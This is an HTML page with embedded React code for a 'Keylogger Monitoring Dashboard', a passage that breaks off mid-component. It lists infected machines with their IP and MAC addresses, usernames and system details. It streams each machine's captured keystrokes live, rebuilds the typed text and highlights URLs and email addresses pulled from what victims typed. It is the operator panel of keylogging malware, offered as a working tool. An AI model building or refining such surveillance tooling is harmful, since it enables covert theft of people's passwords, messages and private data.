<!DOCTYPE html>
<html lang="en" dir="ltr" data-bs-theme="dark">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keylogger Monitoring Dashboard</title>

    <!-- Favicon -->
    <link rel="icon" type="image/x-icon" href="/favicon.ico">

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">

    <script crossorigin src="https://unpkg.com/react@18/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>

    <script src="https://unpkg.com/babel-standalone@6.26.0/babel.min.js"></script>

    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;700&display=swap');

        :root {
            --bs-body-font-family: 'Inter', sans-serif;
            --bs-body-bg: #1a1a1a;
            --bs-tertiary-bg: #242424;
            --bs-border-color: #3a3a3a;
            --cyber-green: #00ff88; /* Cyber green color */


            --bg-dark: #1a1a1a;
            --bg-card: #2d2d2d;
            --bg-card-hover: #3a3a3a;
            --text-primary: #ffffff;
            --text-secondary: #b3b3b3;
            --accent-green: #10b981;
            --border-color: #404040;
        }

        body {
            background-color: var(--bs-body-bg);
        }

        .dashboard-header {
            border-bottom: 1px solid var(--bs-border-color);
            padding-bottom: 1rem;
        }

        .kpi-card {
            background-color: var(--bs-tertiary-bg);
            border: 1px solid var(--bs-border-color);
            transition: background-color 0.2s ease-in-out;
            height: 100%; /* Uniform height */
            min-height: 120px; /* Minimum height */
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
        }

        .kpi-card:hover {
            background-color: #2c2c2c;
        }

        .kpi-card .kpi-icon {
            font-size: 2rem;
            color: var(--cyber-green); /* Cyber green */
            margin-bottom: 0.5rem;
        }

        .kpi-card .kpi-content {
            text-align: center;
            width: 100%;
        }

        .kpi-card .kpi-value {
            font-size: 1.5rem;
            font-weight: 500;
            margin-top: 0.25rem;
        }

        .kpi-card .kpi-label {
            font-size: 0.875rem;
            color: var(--bs-secondary);
            margin-bottom: 0.25rem;
        }

        .card {
            background-color: var(--bs-tertiary-bg);
            border: 1px solid var(--bs-border-color);
        }

        .table-hover tbody tr:hover {
            background-color: #2c2c2c;
        }

        /* FIX 2 HERE: Added a wrapper for the table to prevent jumping on refresh */
        .table-wrapper {
            min-height: 500px; /* This ensures the container doesn't collapse during loading */
        }

        .logs-table {
            font-size: 0.9rem;
        }

        .logs-table th, .logs-table td {
            text-align: center;
            vertical-align: middle;
        }

        .truncate {
            max-width: 350px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            direction: ltr;
            text-align: left;
        }

        .form-control, .form-select {
            background-color: #2c2c2c;
            border-color: var(--bs-border-color);
        }

        .form-control:focus, .form-select:focus {
            background-color: #303030;
            border-color: var(--bs-primary);
            box-shadow: 0 0 0 0.25rem rgba(var(--bs-primary-rgb), 0.25);
        }

        .os-icon {
            font-size: 1.2rem;
            vertical-align: middle;
        }

        .badge {
            font-weight: 500;
        }

        /* CSS for machine cards */
        .machine-card {
            transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
        }

        .machine-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0, 255, 136, 0.2);
        }

        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            display: inline-block;
        }

        .status-dot.active {
            background-color: var(--cyber-green);
            box-shadow: 0 0 6px var(--cyber-green);
        }

        .status-dot.inactive {
            background-color: #dc3545;
            box-shadow: 0 0 6px rgba(220, 53, 69, 0.5);
        }

        /* CSS for Timeline */
        .timeline-container {
            display: flex;
            height: 500px;
            background-color: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            overflow: hidden;
        }

        .timeline-sidebar {
            width: 120px;
            background-color: #222;
            border-left: 3px solid var(--cyber-green);
            position: relative;
            flex-shrink: 0;
        }

        .timeline-content-area {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            color: #fff;
            line-height: 1.6;
            direction: ltr;
            text-align: left;
            background-color: #1a1a1a;
        }

        .time-marker {
            position: absolute;
            left: 5px;
            right: 5px;
            font-size: 0.75rem;
            color: var(--cyber-green);
            background-color: rgba(26, 26, 26, 0.9);
            padding: 2px 4px;
            border-radius: 4px;
            text-align: center;
            border: 1px solid rgba(0, 255, 136, 0.3);
            z-index: 10;
        }

        .time-marker::before {
            content: '';
            position: absolute;
            left: -15px;
            top: 50%;
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background-color: var(--cyber-green);
            transform: translateY(-50%);
            box-shadow: 0 0 4px rgba(0, 255, 136, 0.7);
            z-index: 5;
        }

        /* Scrollbar styling for timeline */
        .timeline-container::-webkit-scrollbar {
            width: 8px;
        }

        .timeline-container::-webkit-scrollbar-track {
            background: #1a1a1a;
            border-radius: 4px;
        }

        .timeline-container::-webkit-scrollbar-thumb {
            background: var(--cyber-green);
            border-radius: 4px;
        }

        .timeline-container::-webkit-scrollbar-thumb:hover {
            background: #00cc6a;
        }

        .highlight {
            text-decoration: underline;
            cursor: pointer;
            color: #b0b0ff;
        }

        @keyframes pulse {
            from {
                opacity: 0.25;
            }
            to {
                opacity: 1;
            }
        }

        .typing-indicator {
            height: 13px;
            width: 5px;
            display: inline-block;
            background: white;
            animation: pulse 0.5s linear infinite alternate;
            margin-bottom: -2px;
            margin-left: 4px;
        }

        /* Animation for refresh button */
        @keyframes spin {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(360deg);
            }
        }

        .animate-spin {
            animation: spin 1s linear infinite;
        }

         .navbar {
            background-color: var(--bs-tertiary-bg);
            border-bottom: 1px solid var(--bs-border-color);
        }

        .navbar-brand {
            color: var(--text-primary) !important;
            font-weight: 600;
        }

        .navbar-nav .nav-link {
            color: var(--text-secondary) !important;
        }

        .navbar-nav .nav-link:hover,
        .navbar-nav .nav-link.active {
            color: var(--text-primary) !important;
        }

    </style>
</head>
<body>
<nav class="navbar navbar-expand-lg">
    <div class="container">
        <a class="navbar-brand" href="/">
            <i class="fas fa-keyboard me-2"></i>
            Keylogger Machines
        </a>
        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNav">
            <ul class="navbar-nav ms-auto">
                <li class="nav-item">
                    <a class="nav-link" href="/">Dashboard</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link active" href="/about">About</a>
                </li>
            </ul>
        </div>
    </div>
</nav>

<div id="root"></div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>

<script type="text/babel">
    const {useState, useEffect, useMemo, useRef} = React;

    const API_BASE = "[[ base_url ]]";

    // New API functions
    const API = {
        fetchMachines: async (filters = {}) => {
            const params = new URLSearchParams();
            if (filters.username) params.append('username', filters.username);
            if (filters.title) params.append('title', filters.title);
            if (filters.status !== '' && filters.status !== undefined) params.append('status', filters.status);
            if (filters.offset) params.append('offset', filters.offset);
            if (filters.limit) params.append('limit', filters.limit);

            const response = await fetch(`${API_BASE}/api/machines/?${params}`);
            if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
            return response.json();
        },

        fetchMachineById: async (machineId) => {
            const response = await fetch(`${API_BASE}/api/machines/${machineId}`);
            if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
            return response.json();
        },

        fetchMachineEvents: async (machineId, offset = 0, limit = 50) => {
            const params = new URLSearchParams();
            params.append('offset', offset);
            params.append('limit', limit);

            const response = await fetch(`${API_BASE}/api/events/${machineId}?${params}`);
            if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
            return response.json();
        },

        fetchEventsCount: async (machineId) => {
            const response = await fetch(`${API_BASE}/api/events/${machineId}/count`);
            if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
            return response.json();
        },

        updateMachineTitle: async (username, title) => {
            const response = await fetch(`${API_BASE}/api/machines/${username}/title`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({title})
            });
            return response.json();
        }
    };

    // Machine Card Component
    function MachineCard({machine, onClick}) {
        const getOSIcon = (system) => {
            if (!system) return <i className="bi bi-question-circle" title="Unknown OS"></i>;
            const lowerSystem = system.toLowerCase();
            if (lowerSystem.includes('windows')) return <i className="bi bi-windows" title={system}></i>;
            if (lowerSystem.includes('mac') || lowerSystem.includes('apple')) return <i className="bi bi-apple"
                                                                                        title={system}></i>;
            if (lowerSystem.includes('linux')) return <i className="bi bi-ubuntu" title={system}></i>;
            return <i className="bi bi-pc-display-horizontal" title={system}></i>;
        };

        const formatDate = (timestamp) => {
            return new Date(timestamp * 1000).toLocaleString('en-US', {
                dateStyle: 'short',
                timeStyle: 'short'
            });
        };

        return (
            <div
                className="card machine-card h-100"
                onClick={() => onClick(machine.id)}
                style={{cursor: 'pointer'}}
                title={`Click to view machine details ${machine.display_username}`}
            >
                <div className="card-header d-flex justify-content-between align-items-center">
                    <div className="d-flex align-items-center">
                        <span className={`status-dot me-2 ${machine.active ? 'active' : 'inactive'}`}></span>
                        <span className="fw-bold">{machine.display_username}</span>
                    </div>
                    {getOSIcon(machine.system)}
                </div>
                <div className="card-body">
                    <div className="mb-2">
                        <small className="text-muted">User:</small>
                        <div className="fw-medium">{machine.machine_username || 'N/A'}</div>
                    </div>
                    <div className="mb-2">
                        <small className="text-muted">IP Address:</small>
                        <div className="font-monospace small">{machine.ip_address}</div>
                    </div>
                    <div className="mb-2">
                        <small className="text-muted">MAC Address:</small>
                        <div className="font-monospace small">{machine.mac_address}</div>
                    </div>
                    <div className="mb-2">
                        <small className="text-muted">Operating System:</small>
                        <div className="small">{machine.system} {machine.release}</div>
                    </div>
                    {machine.title && (
                        <div className="mb-2">
                            <small className="text-muted">Title:</small>
                            <div className="small">{machine.title}</div>
                        </div>
                    )}
                    <div>
                        <small className="text-muted">First Connection:</small>
                        <div className="small">{formatDate(machine.first_login)}</div>
                    </div>
                </div>
            </div>
        );
    }

    // Machines List Component
    function MachinesListView({onMachineSelect}) {
        const [machines, setMachines] = useState([]);
        const [loading, setLoading] = useState(true);
        const [error, setError] = useState(null);
        const [filters, setFilters] = useState({
            username: '',
            title: '',
            status: '',
            offset: 0,
            limit: 20
        });

        const loadMachines = async () => {
            try {
                setLoading(true);
                setError(null);
                const data = await API.fetchMachines(filters);
                setMachines(data);
            } catch (error) {
                console.error('Error loading machines:', error);
                setError('Error loading machines. Please try again.');
            } finally {
                setLoading(false);
            }
        };

        useEffect(() => {
            loadMachines();

            // Auto-refresh every 30 seconds
            const interval = setInterval(loadMachines, 30000);
            return () => clearInterval(interval);
        }, []);

        const applyFilters = () => {
            loadMachines();
        };

        const resetFilters = () => {
            setFilters({
                username: '',
                title: '',
                status: '',
                offset: 0,
                limit: 20
            });
            setTimeout(loadMachines, 100);
        };

        const activeMachines = machines.filter(m => m.active).length;
        const totalMachines = machines.length;

        return (
            <div>
                {/* Statistics */}
                <div className="row g-3 mb-4">
                    <div className="col-md-3">
                        <div className="card kpi-card p-3">
                            <div className="kpi-content">
                                <div className="kpi-icon"><i className="bi bi-pc-display"></i></div>
                                <div className="kpi-label">Total Machines</div>
                                <div className="kpi-value">{loading ? '...' : totalMachines}</div>
                            </div>
                        </div>
                    </div>
                    <div className="col-md-3">
                        <div className="card kpi-card p-3">
                            <div className="kpi-content">
                                <div className="kpi-icon"><i className="bi bi-wifi"></i></div>
                                <div className="kpi-label">Active Machines</div>
                                <div className="kpi-value">{loading ? '...' : activeMachines}</div>
                            </div>
                        </div>
                    </div>
                    <div className="col-md-3">
                        <div className="card kpi-card p-3">
                            <div className="kpi-content">
                                <div className="kpi-icon"><i className="bi bi-wifi-off"></i></div>
                                <div className="kpi-label">Inactive Machines</div>
                                <div className="kpi-value">{loading ? '...' : (totalMachines - activeMachines)}</div>
                            </div>
                        </div>
                    </div>
                    <div className="col-md-3">
                        <div className="card kpi-card p-3">
                            <div className="kpi-content">
                                <div className="kpi-icon"><i className="bi bi-percent"></i></div>
                                <div className="kpi-label">Activity Rate</div>
                                <div
                                    className="kpi-value">{loading ? '...' : totalMachines > 0 ? Math.round((activeMachines / totalMachines) * 100) + '%' : '0%'}</div>
                            </div>
                        </div>
                    </div>
                </div>

                {/* Filters */}
                <div className="card mb-4">
                    <div className="card-header">
                        <h5 className="mb-0">Filter Machines</h5>
                    </div>
                    <div className="card-body">
                        <div className="row g-2 mb-3">
                            <div className="col-md-3">
                                <input
                                    className="form-control"
                                    placeholder="Search by username"
                                    value={filters.username}
                                    onChange={(e) => setFilters({...filters, username: e.target.value})}
                                />
                            </div>
                            <div className="col-md-3">
                                <input
                                    className="form-control"
                                    placeholder="Search by title"
                                    value={filters.title}
                                    onChange={(e) => setFilters({...filters, title: e.target.value})}
                                />
                            </div>
                            <div className="col-md-2">
                                <select
                                    className="form-select"
                                    value={filters.status}
                                    onChange={(e) => setFilters({...filters, status: e.target.value})}
                                >
                                    <option value="">All Statuses</option>
                                    <option value="true">Active</option>
                                    <option value="false">Inactive</option>
                                </select>
                            </div>
                            <div className="col-md-2">
                                <button className="btn btn-primary w-100" onClick={applyFilters}>
                                    <i className="bi bi-search me-1"></i>Search
                                </button>
                            </div>
                            <div className="col-md-2">
                                <button className="btn btn-outline-secondary w-100" onClick={resetFilters}>
                                    <i className="bi bi-arrow-clockwise me-1"></i>Clear
                                </button>
                            </div>
                        </div>
                    </div>
                </div>

                {/* Machines List */}
                <div className="card">
                    <div className="card-header d-flex justify-content-between align-items-center">
                        <h5 className="mb-0">Machines ({machines.length})</h5>
                        <button
                            className="btn btn-sm btn-outline-primary"
                            onClick={loadMachines}
                            disabled={loading}
                        >
                            <i className={`bi ${loading ? 'bi-arrow-repeat animate-spin' : 'bi-arrow-clockwise'} me-1`}></i>
                            Refresh
                        </button>
                    </div>
                    <div className="card-body">
                        {error && (
                            <div className="alert alert-danger" role="alert">
                                <i className="bi bi-exclamation-triangle me-2"></i>
                                {error}
                                <button className="btn btn-sm btn-outline-danger ms-2" onClick={loadMachines}>
                                    Try Again
                                </button>
                            </div>
                        )}
                        {loading ? (
                            <div className="text-center p-5">
                                <div className="spinner-border" role="status">
                                    <span className="visually-hidden">Loading...</span>
                                </div>
                            </div>
                        ) : machines.length === 0 ? (
                            <div className="text-center p-5 text-muted">
                                <i className="bi bi-pc-display display-1"></i>
                                <h5 className="mt-3">No machines found</h5>
                                <p>Try changing the filters or wait for new machines to connect</p>
                            </div>
                        ) : (
                            <div className="row g-3">
                                {machines.map(machine => (
                                    <div key={machine.id} className="col-md-6 col-lg-4 col-xl-3">
                                        <MachineCard machine={machine} onClick={onMachineSelect}/>
                                    </div>
                                ))}
                            </div>
                        )}
                    </div>
                </div>
            </div>
        );
    }

    // Machine Details Component
    function MachineDetailView({machineId, onBack}) {
        const [machine, setMachine] = useState(null);
        const [events, setEvents] = useState([]);
        const [loading, setLoading] = useState(true);
        const [eventsLoading, setEventsLoading] = useState(true);
        const [autoScroll, setAutoScroll] = useState(true);
        const [eventsCount, setEventsCount] = useState(0);
        const [socketConnected, setSocketConnected] = useState(false);
        const [title, setTitle] = useState("")
        const timelineRef = useRef(null);
        const [isFullScreen, setIsFullScreen] = useState(false)

        const [tooltip, setTooltip] = useState({
            visible: false,
            text: "",
            x: 0,
            y: 0,
        });

        const handleMouseOver = (e, unix) => {
            setTooltip({
                visible: true,
                text: formatTime(unix),
                x: e.clientX + window.scrollX,
                y: e.clientY + window.scrollY,
            });
        };

        const handleMouseMove = (e) => {
            setTooltip((prev) => ({
                ...prev,
                x: e.clientX + window.scrollX,
                y: e.clientY + window.scrollY,
            }));
        };

        const handleMouseOut = () => {
            setTooltip((prev) => ({ ...prev, visible: false }));
        };

        const loadMachineData = async () => {
            try {
                setLoading(true);
                const machineData = await API.fetchMachineById(machineId);
                setMachine(machineData);
                return machineData
            } catch (error) {
                console.error('Error loading machine:', error);
            } finally {
                setLoading(false);
            }
        };

        function timeAgo(unixTime) {
            // Support both seconds and milliseconds
            const timestamp = unixTime < 1e12 ? unixTime * 1000 : unixTime;
            const now = Date.now();
            const diffMs = now - timestamp;

            const seconds = Math.floor(diffMs / 1000);
            const minutes = Math.floor(seconds / 60);
            const hours   = Math.floor(minutes / 60);
            const days    = Math.floor(hours / 24);
            const weeks   = Math.floor(days / 7);
            const months  = Math.floor(days / 30);
            const years   = Math.floor(days / 365);

            if (seconds < 60) return `${seconds}s ago`;
            if (minutes < 60) return `${minutes}m ago`;
            if (hours < 24)   return `${hours}h ago`;
            if (days < 7)     return `${days}d ago`;
            if (weeks < 5)    return `${weeks}w ago`;
            if (months < 12)  return `${months}mo ago`;
            return `${years}y ago`;
        }

        const loadEvents = async () => {
            try {
                setEventsLoading(true);
                const [eventsData, countData] = await Promise.all([
                    API.fetchMachineEvents(machineId, 0, 10000),
                    API.fetchEventsCount(machineId)
                ]);
                setEvents(eventsData.reverse());
                setEventsCount(countData.count);
            } catch (error) {
                console.error('Error loading events:', error);
            } finally {
                setEventsLoading(false);
            }
        };

        const scrollToBottom = () => {
            const contentArea = timelineRef.current && timelineRef.current.querySelector('.timeline-content-area');
            if (contentArea) {
                contentArea.scrollTop = contentArea.scrollHeight;
            }
        };

        function _print() {
            // todo()
            if (!timelineRef.current) return
            const content = timelineRef.current.innerHTML;
            const win = window.open("", "", "width=800,height=600");
            win.document.write(`
          <html>
            <head>
              <title>KeyLogger</title>
              <style>
                body { font-family: Arial; direction: rtl; }
              </style>
            </head>
            <body>${content}</body>
          </html>
        `);
            win.document.close();
            win.focus();
            win.print();
            // win.close();
        }

        const toggleFullScreen = () => {
            if (!timelineRef.current) return
            if (!document.fullscreenElement) {
                timelineRef.current.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        const toggleAutoScroll = () => {
            setAutoScroll(!autoScroll);
            if (!autoScroll) {
                setTimeout(scrollToBottom, 100);
            }
        };

        const updateTitle = () => {
            if (!title) return
            API.updateMachineTitle(machine.display_username, title)
        }

        useEffect(() => {
            loadEvents();

            // WebSocket connection for real-time updates
            const socket = io(API_BASE);

            socket.on('connect', () => {
                console.log('Connected to WebSocket');
                setSocketConnected(true);
            });

            socket.on('disconnect', () => {
                console.log('Disconnected from WebSocket');
                setSocketConnected(false);
            });

            loadMachineData().then(machineData => {

                socket.on('front-ev', (eventData) => {
                    if (eventData.username === machineData.display_username) {
                        setEvents(prev => [...prev, eventData]);
                        setEventsCount(prev => prev + 1);
                        if (autoScroll) {
                            setTimeout(scrollToBottom, 100);
                        }
                    }
                });

            })

            socket.on('machine_status_changed', (statusData) => {
                if (statusData.machine_id === parseInt(machineId)) {
                    setMachine(prev => ({...prev, active: statusData.active}));
                }
            });

            return () => {
                socket.disconnect();
            };
        }, [machineId]);

        useEffect(() => {
            if (autoScroll && events.length > 0) {
                setTimeout(scrollToBottom, 100);
            }
        }, [events, autoScroll]);

        const formatDate = (timestamp) => {
            return new Date(timestamp * 1000).toLocaleString('en-US', {
                dateStyle: 'full',
                timeStyle: 'medium'
            });
        };

        const formatTime = (timestamp) => {
            console.log(timestamp)
            return new Date(Number(timestamp) * 1000).toLocaleString('en-US', {
                timeStyle: 'medium'
            });
        };

        const getOSIcon = (system) => {
            if (!system) return <i className="bi bi-question-circle" title="Unknown OS"></i>;
            const lowerSystem = system.toLowerCase();
            if (lowerSystem.includes('windows')) return <i className="bi bi-windows" title={system}></i>;
            if (lowerSystem.includes('mac') || lowerSystem.includes('apple')) return <i className="bi bi-apple"
                                                                                        title={system}></i>;
            if (lowerSystem.includes('linux')) return <i className="bi bi-ubuntu" title={system}></i>;
            return <i className="bi bi-pc-display-horizontal" title={system}></i>;
        };

        // Function to convert events to continuous text
        const convertEventsToSpans = (eventsList) => {
            let items = [];

            // The array comes from newest to oldest, so we iterate from start to end to get correct chronological order
            for (let i = 0; i < eventsList.length; i++) {
                const event = eventsList[i];
                const eventText = event.event;

                if (eventText === '\n' || eventText === 'Key.enter') {
                    items.push(<br key={i}></br>)
                } else if (eventText === '\b' || eventText === 'Key.backspace') {
                    items.pop()
                } else if (eventText === '\t' || eventText === 'Key.tab') {
                    items.push(<span key={i}>    </span>)
                } else if (eventText === 'Key.space') {
                    items.push(<span key={i}> </span>)
                } else if (eventText.length === 1 && !eventText.match(/[\u0000-\u001F]/) ||
                    (eventText.match(/[\u0000-\u001F]/) && eventText !== '\u0003' && eventText !== '\u0001')) {
                    // Regular character or allowed control character
                    items.push(<span
                        key={i}
                        onMouseOver={(e) => handleMouseOver(e, event.timestamp)}
                        onMouseMove={handleMouseMove}
                        onMouseOut={handleMouseOut}
                        data-time={event.timestamp} children={eventText}></span>)
                }
                // Skip other special keys
            }

            return items;
        };

        let itemsToRender = convertEventsToSpans(events);

        const findHighlightsInReactElements = (elements) => {
            const newElements = [];
            const highlights = [];
            const textParts = [];
            const offsets = [];
            let currentOffset = 0;

            elements.forEach(el => {
                if (React.isValidElement(el) && typeof el.props.children === 'string') {
                    const textContent = el.props.children;
                    textParts.push(textContent);
                    offsets.push(currentOffset);
                    currentOffset += textContent.length;
                } else {
                    textParts.push('');
                    offsets.push(currentOffset);
                }
            });

            const fullText = textParts.join('');

            const urlRegex = /(https?:\/\/[^\s]+)/g;
            const emailRegex = /([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/g;

            let match;
            while ((match = urlRegex.exec(fullText)) !== null) {
                highlights.push({
                    type: 'url',
                    offset: match.index,
                    size: match[0].length,
                    value: match[0]
                });
            }
            while ((match = emailRegex.exec(fullText)) !== null) {
                highlights.push({
                    type: 'email',
                    offset: match.index,
                    size: match[0].length,
                    value: match[0]
                });
            }

            highlights.sort((a, b) => a.offset - b.offset);

            let elementIndex = 0;
            let highlightIndex = 0;

            while (elementIndex < elements.length) {
                const currentElement = elements[elementIndex];
                const currentHighlight = highlights[highlightIndex];
                const currentOffsetInText = offsets[elementIndex];

                if (currentHighlight && currentOffsetInText === currentHighlight.offset) {
                    const combinedText = fullText.slice(
                        currentHighlight.offset,
                        currentHighlight.offset + currentHighlight.size
                    );

                    const href = currentHighlight.type === 'email' ? `mailto:${combinedText}` : combinedText;

                    newElements.push(
                        <a {...currentElement.props} href={href} target="_blank" className="highlight">
                            {combinedText}
                        </a>
                    );

                    elementIndex += currentHighlight.size;
                    highlightIndex++;
                } else {
                    newElements.push(currentElement);
                    elementIndex++;
                }
            }

            return newElements;
        };

        itemsToRender = findHighlightsInReactElements(itemsToRender)

        // Creating real time points for timeline - only minutes
        const createTimePoints = () => {
            if (events.length === 0) return [];

            const firstTime = events[events.length - 1].timestamp; // Oldest
            const lastTime = events[0].timestamp; // Newest
            const timeDiff = lastTime - firstTime;

            // Take only events with at least a minute difference
            const timePoints = [];
            const seenMinutes = new Set();

            for (let i = 0; i < events.length; i++) {
                const event = events[i];
                const eventDate = new Date(event.timestamp * 1000);
                const minuteKey = `${eventDate.getHours()}:${eventDate.getMinutes().toString().padStart(2, '0')}`;

                if (!seenMinutes.has(minuteKey)) {
                    seenMinutes.add(minuteKey);
                    const relativeTime = (event.timestamp - firstTime) / timeDiff;
                    const position = (1 - relativeTime) * 90 + 5; // Inverted because newest is at top

                    timePoints.push({
                        timestamp: event.timestamp,
                        position: position,
                        timeLabel: minuteKey
                    });
                }
            }

            return timePoints;
        };

        const timePoints = createTimePoints();

        if (loading) {
            return (
                <div className="text-center p-5">
                    <div className="spinner-border" role="status">
                        <span className="visually-hidden">Loading...</span>
                    </div>
                </div>
            );
        }

        if (!machine) {
            return (
                <div className="text-center p-5 text-muted">
                    <i className="bi bi-exclamation-triangle display-1"></i>
                    <h5 className="mt-3">Machine not found</h5>
                    <button className="btn btn-primary mt-3" onClick={onBack}>
                        Return to Machine List
                    </button>
                </div>
            );
        }

        return (
            <div>
                <div className="mb-3">
                    <button className="btn btn-outline-secondary" onClick={onBack}>
                        <i className="bi bi-arrow-left me-2"></i>Return to Machine List
                    </button>
                </div>

                <div className="card mb-4">
                    <div className="card-header d-flex justify-content-between align-items-center">
                        <div className="d-flex align-items-center">
                            <span className={`status-dot me-3 ${machine.active ? 'active' : 'inactive'}`}></span>
                            <div>
                                <h4 className="mb-0">{machine.display_username}</h4>
                                {machine.title ? <h6>{machine.title}</h6> : <input
                                    type="text" placeholder="Enter a title..." onBlur={updateTitle}
                                    value={title} onChange={setTitle}
                                />}
                                <small className="text-muted">
                                    {machine.active ? 'Active' : 'Inactive'} • First
                                    connected {formatDate(machine.first_login)}
                                </small>
                            </div>
                        </div>
                        <div className="fs-2">
                            {getOSIcon(machine.system)}
                        </div>
                    </div>
                    <div className="card-body">
                        <div className="row">
                            <div className="col-md-6">
                                <div className="mb-3">
                                    <strong className="text-muted">System Details:</strong>
                                    <div className="mt-1">
                                        <div><strong>Operating System:</strong> {machine.system} {machine.release}</div>
                                        <div><strong>Version:</strong> {machine.version}</div>
                                        <div><strong>Processor:</strong> {machine.processor}</div>
                                        <div><strong>Architecture:</strong> {machine.machine}</div>
                                        <div><strong>Computer Name:</strong> {machine.node}</div>
                                    </div>
                                </div>
                            </div>
                            <div className="col-md-6">
                                <div className="mb-3">
                                    <strong className="text-muted">Network and User Details:</strong>
                                    <div className="mt-1">
                                        <div><strong>IP Address:</strong> <span
                                            className="font-monospace">{machine.ip_address}</span></div>
                                        <div><strong>MAC Address:</strong> <span
                                            className="font-monospace">{machine.mac_address}</span></div>
                                        <div><strong>Username:</strong> {machine.machine_username}</div>
                                        {machine.title && <div><strong>Title:</strong> {machine.title}</div>}
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div className="row g-3 mb-4">
                    <div className="col-md-4">
                        <div className="card kpi-card p-3">
                            <div className="kpi-content">
                                <div className="kpi-icon"><i className="bi bi-keyboard"></i></div>
                                <div className="kpi-label">Total Events</div>
                                <div className="kpi-value">{eventsLoading ? '...' : eventsCount.toLocaleString()}</div>
                            </div>
                        </div>
                    </div>
                    <div className="col-md-4">
                        <div className="card kpi-card p-3">
                            <div className="kpi-content">
                                <div className="kpi-icon"><i className="bi bi-clock-history"></i></div>
                                <div className="kpi-label">Displayed Events</div>
                                <div className="kpi-value">{events.length}</div>
                            </div>
                        </div>
                    </div>
                    <div className="col-md-4">
                        <div className="card kpi-card p-3">
                            <div className="kpi-content">
                                <div className="kpi-icon">
                                    <i className={`bi ${socketConnected ? 'bi-wifi text-success' : 'bi-wifi-off text-danger'}`}></i>
                                </div>
                                <div className="kpi-label">WebSocket</div>
                                <div className="kpi-value">{socketConnected ? 'Connected' : 'Disconnected'}</div>
                            </div>
                        </div>
                    </div>
                </div>

                <div className="card">
                    <div className="card-header d-flex justify-content-between align-items-center">
                        <h5 className="mb-0">Typing History</h5>
                        <div>
                            <button onClick={() => _print(itemsToRender)}
                                    className="btn btn-sm btn-outline-primary ms-2">
                                <i className="bi bi-printer-fill me-1"></i>
                                Print
                            </button>
                            <button onClick={toggleFullScreen}
                                    className="btn btn-sm btn-outline-primary ms-2">
                                <i className={`bi ${isFullScreen ? "bi-fullscreen-exit" : "bi-fullscreen"} me-1`}></i>
                                {isFullScreen && "Exit"} Full Screen
                            </button>
                            <button
                                className={`btn btn-sm ${autoScroll ? 'btn-success' : 'btn-outline-secondary'}`}
                                onClick={toggleAutoScroll}
                            >
                                <i className={`bi ${autoScroll ? 'bi-pause-fill' : 'bi-play-fill'} me-1`}></i>
                                {autoScroll ? 'Stop Scroll' : 'Auto Scroll'}
                            </button>
                            <button
                                className="btn btn-sm btn-outline-primary ms-2"
                                onClick={scrollToBottom}
                            >
                                <i className="bi bi-arrow-down me-1"></i>
                                Scroll to Bottom
                            </button>
                        </div>
                    </div>
                    <div className="card-body p-0">
                        {eventsLoading ? (
                            <div className="text-center p-5">
                                <div className="spinner-border" role="status">
                                    <span className="visually-hidden">Loading events...</span>
                                </div>
                            </div>
                        ) : events.length === 0 ? (
                            <div className="text-center p-5 text-muted">
                                <i className="bi bi-keyboard display-1"></i>
                                <h5 className="mt-3">No typing events</h5>
                                <p>No typing events recorded for this machine</p>
                            </div>
                        ) : (
                            <div className="timeline-container position-relative" ref={timelineRef}>
                                <div className="timeline-sidebar">
                                    {timePoints.map((point, index) => (
                                        <div
                                            key={index}
                                            className="time-marker"
                                            style={{top: `${point.position}%`}}
                                        >
                                            {point.timeLabel}
                                        </div>
                                    ))}
                                </div>
                                <div className="timeline-content-area">
                                    {itemsToRender.length ? itemsToRender : "No data to display..."}
                                    <span className="typing-indicator" ></span>
                                </div>


                                {/** todo(need to update) */}
                                {events.length > 0 && <div>Last event {timeAgo(events.at(-1).timestamp)} ago</div>}


                                {tooltip.visible && (
                                    <div
                                        className=" tooltip bs-tooltip-top show position-absolute"
                                        style={{
                                            position: "absolute",
                                            right: 10,
                                            top:  40, // todo fix to fit the element position
                                            zIndex: 9999,
                                            pointerEvents: "none",

                                        }}
                                    >
                                        <div className="tooltip-arrow"></div>
                                        <div className="tooltip-inner">{tooltip.text}</div>
                                    </div>
                                )}
                            </div>
                        )}
                    </div>
                </div>
            </div>
        );
    }

    // Main component with routing
    function App() {
        const [currentView, setCurrentView] = useState('machines');
        const [selectedMachineId, setSelectedMachineId] = useState(null);

        const showMachineDetail = (machineId) => {
            setSelectedMachineId(machineId);
            setCurrentView('machine-detail');
        };

        const showMachinesList = () => {
            setCurrentView('machines');
            setSelectedMachineId(null);
        };

        return (
            <div className="container-fluid p-4">
